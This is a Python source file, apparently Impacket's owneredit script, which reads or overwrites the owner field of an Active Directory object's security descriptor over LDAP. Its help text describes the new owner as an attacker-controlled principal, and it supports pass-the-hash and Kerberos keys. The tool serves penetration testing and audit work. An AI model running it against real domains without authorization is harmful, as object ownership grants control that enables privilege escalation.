#!/usr/bin/env python3
# Impacket - Collection of Python classes for working with network protocols.
#
# Copyright Fortra, LLC and its affiliated companies 
#
# All rights reserved.
#
# This software is provided under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Description:
#   Python script for handling the msDS-AllowedToActOnBehalfOfOtherIdentity property of a target computer
#
# Authors:
#   Charlie BROMBERG (@_nwodtuhs)

import argparse
import logging
import sys
import traceback

import ldap3
import ldapdomaindump
from ldap3.protocol.formatters.formatters import format_sid

from impacket import version
from impacket.examples import logger, utils
from impacket.ldap import ldaptypes
from ldap3.utils.conv import escape_filter_chars
from ldap3.protocol.microsoft import security_descriptor_control

from impacket.examples.utils import init_ldap_session, parse_identity


# Universal SIDs
WELL_KNOWN_SIDS = {
    'S-1-0': 'Null Authority',
    'S-1-0-0': 'Nobody',
    'S-1-1': 'World Authority',
    'S-1-1-0': 'Everyone',
    'S-1-2': 'Local Authority',
    'S-1-2-0': 'Local',
    'S-1-2-1': 'Console Logon',
    'S-1-3': 'Creator Authority',
    'S-1-3-0': 'Creator Owner',
    'S-1-3-1': 'Creator Group',
    'S-1-3-2': 'Creator Owner Server',
    'S-1-3-3': 'Creator Group Server',
    'S-1-3-4': 'Owner Rights',
    'S-1-5-80-0': 'All Services',
    'S-1-4': 'Non-unique Authority',
    'S-1-5': 'NT Authority',
    'S-1-5-1': 'Dialup',
    'S-1-5-2': 'Network',
    'S-1-5-3': 'Batch',
    'S-1-5-4': 'Interactive',
    'S-1-5-6': 'Service',
    'S-1-5-7': 'Anonymous',
    'S-1-5-8': 'Proxy',
    'S-1-5-9': 'Enterprise Domain Controllers',
    'S-1-5-10': 'Principal Self',
    'S-1-5-11': 'Authenticated Users',
    'S-1-5-12': 'Restricted Code',
    'S-1-5-13': 'Terminal Server Users',
    'S-1-5-14': 'Remote Interactive Logon',
    'S-1-5-15': 'This Organization',
    'S-1-5-17': 'This Organization',
    'S-1-5-18': 'Local System',
    'S-1-5-19': 'NT Authority',
    'S-1-5-20': 'NT Authority',
    'S-1-5-32-544': 'Administrators',
    'S-1-5-32-545': 'Users',
    'S-1-5-32-546': 'Guests',
    'S-1-5-32-547': 'Power Users',
    'S-1-5-32-548': 'Account Operators',
    'S-1-5-32-549': 'Server Operators',
    'S-1-5-32-550': 'Print Operators',
    'S-1-5-32-551': 'Backup Operators',
    'S-1-5-32-552': 'Replicators',
    'S-1-5-64-10': 'NTLM Authentication',
    'S-1-5-64-14': 'SChannel Authentication',
    'S-1-5-64-21': 'Digest Authority',
    'S-1-5-80': 'NT Service',
    'S-1-5-83-0': 'NT VIRTUAL MACHINE\\Virtual Machines',
    'S-1-16-0': 'Untrusted Mandatory Level',
    'S-1-16-4096': 'Low Mandatory Level',
    'S-1-16-8192': 'Medium Mandatory Level',
    'S-1-16-8448': 'Medium Plus Mandatory Level',
    'S-1-16-12288': 'High Mandatory Level',
    'S-1-16-16384': 'System Mandatory Level',
    'S-1-16-20480': 'Protected Process Mandatory Level',
    'S-1-16-28672': 'Secure Process Mandatory Level',
    'S-1-5-32-554': 'BUILTIN\\Pre-Windows 2000 Compatible Access',
    'S-1-5-32-555': 'BUILTIN\\Remote Desktop Users',
    'S-1-5-32-557': 'BUILTIN\\Incoming Forest Trust Builders',
    'S-1-5-32-556': 'BUILTIN\\Network Configuration Operators',
    'S-1-5-32-558': 'BUILTIN\\Performance Monitor Users',
    'S-1-5-32-559': 'BUILTIN\\Performance Log Users',
    'S-1-5-32-560': 'BUILTIN\\Windows Authorization Access Group',
    'S-1-5-32-561': 'BUILTIN\\Terminal Server License Servers',
    'S-1-5-32-562': 'BUILTIN\\Distributed COM Users',
    'S-1-5-32-569': 'BUILTIN\\Cryptographic Operators',
    'S-1-5-32-573': 'BUILTIN\\Event Log Readers',
    'S-1-5-32-574': 'BUILTIN\\Certificate Service DCOM Access',
    'S-1-5-32-575': 'BUILTIN\\RDS Remote Access Servers',
    'S-1-5-32-576': 'BUILTIN\\RDS Endpoint Servers',
    'S-1-5-32-577': 'BUILTIN\\RDS Management Servers',
    'S-1-5-32-578': 'BUILTIN\\Hyper-V Administrators',
    'S-1-5-32-579': 'BUILTIN\\Access Control Assistance Operators',
    'S-1-5-32-580': 'BUILTIN\\Remote Management Users',
}

class OwnerEdit(object):
    def __init__(self, ldap_server, ldap_session, args):
        super(OwnerEdit, self).__init__()
        self.ldap_server = ldap_server
        self.ldap_session = ldap_session

        self.target_sAMAccountName = args.target_sAMAccountName
        self.target_SID = args.target_SID
        self.target_DN = args.target_DN

        self.new_owner_sAMAccountName = args.new_owner_sAMAccountName
        self.new_owner_SID = args.new_owner_SID
        self.new_owner_DN = args.new_owner_DN

        logging.debug('Initializing domainDumper()')
        cnf = ldapdomaindump.domainDumpConfig()
        cnf.basepath = None
        self.domain_dumper = ldapdomaindump.domainDumper(self.ldap_server, self.ldap_session, cnf)

        if self.target_sAMAccountName or self.target_SID or self.target_DN:
            # Searching for target account with its security descriptor
            self.search_target_principal_security_descriptor()
            # Extract security descriptor data
            self.target_principal_raw_security_descriptor = self.target_principal['nTSecurityDescriptor'].raw_values[0]
            self.target_principal_security_descriptor = ldaptypes.SR_SECURITY_DESCRIPTOR(data=self.target_principal_raw_security_descriptor)

        # Searching for the owner SID if any owner argument was given and new_owner_SID wasn't
        if self.new_owner_SID is None and self.new_owner_sAMAccountName is not None or self.new_owner_DN is not None:
            _lookedup_owner = ""
            if self.new_owner_sAMAccountName is not None:
                _lookedup_owner = self.new_owner_sAMAccountName
                self.ldap_session.search(self.domain_dumper.root, '(sAMAccountName=%s)' % escape_filter_chars(_lookedup_owner), attributes=['objectSid'])
            elif self.new_owner_DN is not None:
                _lookedup_owner = self.new_owner_DN
                self.ldap_session.search(self.domain_dumper.root, '(distinguishedName=%s)' % _lookedup_owner, attributes=['objectSid'])
            try:
                self.new_owner_SID = format_sid(self.ldap_session.entries[0]['objectSid'].raw_values[0])
                logging.debug("Found new owner SID: %s" % self.new_owner_SID)
            except IndexError:
                logging.error('New owner SID not found in LDAP (%s)' % _lookedup_owner)
                exit(1)

    def read(self):
        current_owner_SID = format_sid(self.target_principal_security_descriptor['OwnerSid']).formatCanonical()
        logging.info("Current owner information below")
        logging.info("- SID: %s" % current_owner_SID)
        logging.info("- sAMAccountName: %s" % self.resolveSID(current_owner_SID))
        self.ldap_session.search(self.domain_dumper.root, '(objectSid=%s)' % current_owner_SID, attributes=['distinguishedName'])
        current_owner_distinguished_name = self.ldap_session.entries[0]
        logging.info("- distinguishedName: %s" % current_owner_distinguished_name['distinguishedName'])

    def write(self):
        logging.debug('Attempt to modify the OwnerSid')
        _new_owner_SID = ldaptypes.LDAP_SID()
        _new_owner_SID.fromCanonical(self.new_owner_SID)
        # lib doesn't set this, but I don't known if it's needed
        # _new_owner_SID['SubLen'] = len(_new_owner_SID['SubAuthority'])
        self.target_principal_security_descriptor['OwnerSid'] = _new_owner_SID

        self.ldap_session.modify(
            self.target_principal.entry_dn,
            {'nTSecurityDescriptor': (ldap3.MODIFY_REPLACE, [
                self.target_principal_security_descriptor.getData()
            ])},
            controls=security_descriptor_control(sdflags=0x01))
        if self.ldap_session.result['result'] == 0:
            logging.info('OwnerSid modified successfully!')
        else:
            if self.ldap_session.result['result'] == 50:
                logging.error('Could not modify object, the server reports insufficient rights: %s',
                              self.ldap_session.result['message'])
            elif self.ldap_session.result['result'] == 19:
                logging.error('Could not modify object, the server reports a constrained violation: %s',
                              self.ldap_session.result['message'])
            else:
                logging.error('The server returned an error: %s', self.ldap_session.result['message'])

    # Attempts to retrieve the Security Descriptor of the specified target
    def search_target_principal_security_descriptor(self):
        _lookedup_principal = ""
        # Set SD flags to only query for OwnerSid
        controls = security_descriptor_control(sdflags=0x01)
        if self.target_sAMAccountName is not None:
            _lookedup_principal = self.target_sAMAccountName
            self.ldap_session.search(self.domain_dumper.root, '(sAMAccountName=%s)' % escape_filter_chars(_lookedup_principal), attributes=['nTSecurityDescriptor'], controls=controls)
        elif self.target_SID is not None:
            _lookedup_principal = self.target_SID
            self.ldap_session.search(self.domain_dumper.root, '(objectSid=%s)' % _lookedup_principal, attributes=['nTSecurityDescriptor'], controls=controls)
        elif self.target_DN is not None:
            _lookedup_principal = self.target_DN
            self.ldap_session.search(self.domain_dumper.root, '(distinguishedName=%s)' % _lookedup_principal, attributes=['nTSecurityDescriptor'], controls=controls)
        try:
            self.target_principal = self.ldap_session.entries[0]
            logging.debug('Target principal found in LDAP (%s)' % _lookedup_principal)
        except IndexError:
            logging.error('Target principal not found in LDAP (%s)' % _lookedup_principal)
            exit(0)

    # Attempts to resolve a SID and return the corresponding samaccountname
    def resolveSID(self, sid):
        # Tries to resolve the SID from the well known SIDs
        if sid in WELL_KNOWN_SIDS.keys() or False:
            return WELL_KNOWN_SIDS[sid]
        # Tries to resolve the SID from the LDAP domain dump
        else:
            self.ldap_session.search(self.domain_dumper.root, '(objectSid=%s)' % sid, attributes=['samaccountname'])
            try:
                dn = self.ldap_session.entries[0].entry_dn
                samname = self.ldap_session.entries[0]['samaccountname']
                return samname
            except IndexError:
                logging.debug('SID not found in LDAP: %s' % sid)
                return ""


def parse_args():
    parser = argparse.ArgumentParser(add_help=True, description='Python editor for a principal\'s DACL.')
    parser.add_argument('identity', action='store', help='domain.local/username[:password]')
    parser.add_argument('-use-ldaps', action='store_true', help='Use LDAPS instead of LDAP')
    parser.add_argument('-ts', action='store_true', help='Adds timestamp to every logging output')
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')

    auth_con = parser.add_argument_group('authentication & connection')
    auth_con.add_argument('-hashes', action="store", metavar="LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
    auth_con.add_argument('-no-pass', action="store_true", help='don\'t ask for password (useful for -k)')
    auth_con.add_argument('-k', action="store_true",
                          help='Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the ones specified in the command line')
    auth_con.add_argument('-aesKey', action="store", metavar="hex key", help='AES key to use for Kerberos Authentication (128 or 256 bits)')
    auth_con.add_argument('-dc-ip', action='store', metavar="ip address",
                          help='IP Address of the domain controller or KDC (Key Distribution Center) for Kerberos. If omitted it will use the domain part (FQDN) specified in the identity parameter')

    new_owner_parser = parser.add_argument_group("owner", description="Object, controlled by the attacker, to set as owner of the target object")
    new_owner_parser.add_argument("-new-owner", dest="new_owner_sAMAccountName", metavar="NAME", type=str, required=False, help="sAMAccountName")
    new_owner_parser.add_argument("-new-owner-sid", dest="new_owner_SID", metavar="SID", type=str, required=False, help="Security IDentifier")
    new_owner_parser.add_argument("-new-owner-dn", dest="new_owner_DN", metavar="DN", type=str, required=False, help="Distinguished Name")

    target_parser = parser.add_argument_group("target", description="Target object to edit the owner of")
    target_parser.add_argument("-target", dest="target_sAMAccountName", metavar="NAME", type=str, required=False, help="sAMAccountName")
    target_parser.add_argument("-target-sid", dest="target_SID", metavar="SID", type=str, required=False, help="Security IDentifier")
    target_parser.add_argument("-target-dn", dest="target_DN", metavar="DN", type=str, required=False, help="Distinguished Name")

    dacl_parser = parser.add_argument_group("dacl editor")
    dacl_parser.add_argument('-action', choices=['read', 'write'], nargs='?', default='read', help='Action to operate on the owner attribute')

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    return parser.parse_args()


def main():
    print(version.BANNER)
    args = parse_args()
    logger.init(args.ts, args.debug)

    if args.action == 'write' and args.new_owner_sAMAccountName is None and args.new_owner_SID is None and args.new_owner_DN is None:
        logging.critical('-owner, -owner-sid, or -owner-dn should be specified when using -action write')
        sys.exit(1)

    if args.action == "restore" and not args.filename:
        logging.critical('-file is required when using -action restore')

    domain, username, password, lmhash, nthash, args.k = parse_identity(args.identity, args.hashes, args.no_pass, args.aesKey, args.k)

    try:
        ldap_server, ldap_session = init_ldap_session(domain, username, password, lmhash, nthash, args.k, args.dc_ip, args.aesKey, args.use_ldaps)
        owneredit = OwnerEdit(ldap_server, ldap_session, args)
        if args.action == 'read':
            owneredit.read()
        elif args.action == 'write':
            owneredit.read()
            owneredit.write()
    except Exception as e:
        if logging.getLogger().level == logging.DEBUG:
            traceback.print_exc()
        logging.error(str(e))


if __name__ == '__main__':
    main()
